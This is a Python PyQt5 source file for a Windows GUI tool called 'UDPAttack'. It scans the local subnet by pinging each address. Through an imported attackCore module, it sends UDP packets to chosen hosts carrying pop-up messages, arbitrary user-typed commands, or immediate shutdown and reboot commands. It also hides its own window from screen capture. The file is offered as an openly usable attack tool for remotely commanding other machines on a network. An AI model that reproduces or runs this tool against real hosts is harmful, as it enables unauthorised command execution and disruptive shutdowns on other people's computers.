from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from ctypes import *
from threading import *
from win32gui import *
from win32con import *
from . import Ui_UDPAttack, attackCore
# import attackCore,Ui_UDPAttack
import sys,socket
import datetime
import subprocess
class UDPAttack(QWidget,Ui_UDPAttack.Ui_UDPAttacker):
    st=pyqtSignal(str)
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.retranslateUi(self)
        self.setup()
        windll.user32.SetWindowDisplayAffinity(int(self.winId()),0x11)
    def setzd(self):
        if self.checkBox.isChecked():
            SetWindowPos(self.winId(),HWND_TOPMOST,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE)
        else:
            SetWindowPos(self.winId(),HWND_NOTOPMOST,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE)
    def showE(self):
        # MessageBox(0,"因不可抗原因，该功能已被移除","NoTopDomain 提示",MB_ICONERROR)
        # return
        if self.isMinimized():
            self.setWindowState(Qt.WindowNoState)
        windll.user32.SetWindowDisplayAffinity(int(self.winId()),0)
        windll.user32.SetWindowDisplayAffinity(int(self.winId()),0x11)
        self.show()
        self.setzd()
    def scanIP(self):
        self.st.emit("[%s]开始扫描局域网IP"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        ip=".".join(socket.gethostbyname(socket.gethostname()).split(".")[:-1])
        cnt=0
        for i in range(0,256):
            if not subprocess.run("ping %s.%d -n1 1 -w 10"%(ip,i),shell=True,stdout=subprocess.PIPE).returncode:
                self.st.emit("[%s]\n获取到IP: %s, 主机名: %s"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),ip+"."+str(i),socket.getfqdn(ip+"."+str(i))))
                if not self.running: break
                cnt+=1
        self.st.emit("[%s]扫描完毕，共获取到 %d 个 IP"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),cnt))
        self.running=0
        self.pushButton_4.setText("扫描IP")
    def closeEvent(self,event):
        self.running=0
    def sendMessage(self):
        if self.textEdit.toPlainText():
            try:
                for ip in self.textEdit.toPlainText().split(";"):
                    ip=ip.strip()
                    if not ip: continue
                    sendList=[]
                    if self.plainTextEdit.toPlainText():
                        sendList.append(attackCore.pkg_sendlist("-msg",self.plainTextEdit.toPlainText().strip().replace("\n"," ")+" "*self.maxl))
                        self.maxl=max(self.maxl,len(self.textEdit_2.toPlainText()))
                    if self.textEdit_2.toPlainText():
                        sendList.append(attackCore.pkg_sendlist("-c",self.textEdit_2.toPlainText().strip().replace("\n","&")+" "*self.maxl))
                        self.maxl=max(self.maxl,len(self.textEdit_2.toPlainText()))
                    attackCore.send(sendList,ip,l=self.spinBox_3.value(),t=self.spinBox.value(),p=self.spinBox_2.value())
            except: pass
        else: self.st.emit("[%s]请输入ip"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    def shutdown(self):
        if self.textEdit.toPlainText():
            try:
                for ip in self.textEdit.toPlainText().split(";"):
                    if not ip: continue
                    attackCore.send([attackCore.pkg_sendlist("-c","shutdown -s -t 0"+" "*self.maxl)],ip)
                    self.maxl=max(self.maxl,len("shutdown -s -t 0"))
            except: pass
        else: self.textBrowser.append("[%s]请输入ip"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    def reboot(self):
        if self.textEdit.toPlainText():
            try:
                for ip in self.textEdit.toPlainText().split(";"):
                    if not ip: continue
                    attackCore.send([attackCore.pkg_sendlist("-c","shutdown -r -t 0"+" "*self.maxl)],ip)
                    self.maxl=max(self.maxl,len("shutdown -s -t 0"))
            except: pass
        self.textBrowser.append("[%s]请输入ip"%datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    def scanIIp(self):
        if not self.running:
            self.running=1
            self.scanThread=Thread(target=self.scanIP)
            self.scanThread.start()
            self.pushButton_4.setText("停止扫描")
        else:
            self.running=0
            self.pushButton_4.setText("扫描IP")
    def setup(self):
        self.running=0
        self.maxl=0
        attackCore.tt=self.st
        self.st.connect(lambda x:self.textBrowser.append(x))
        self.spinBox.wheelEvent=lambda x:None
        self.spinBox_2.wheelEvent=lambda x:None
        self.spinBox_3.wheelEvent=lambda x:None
        self.checkBox.clicked.connect(self.setzd)
        self.pushButton_4.clicked.connect(self.scanIIp)
        self.pushButton.clicked.connect(lambda:Thread(target=self.sendMessage).start())
        self.pushButton_2.clicked.connect(self.shutdown)
        self.pushButton_3.clicked.connect(self.reboot)
if __name__=="__main__":
    app=QApplication(sys.argv)
    window=UDPAttack()
    window.showE()
    sys.exit(app.exec_())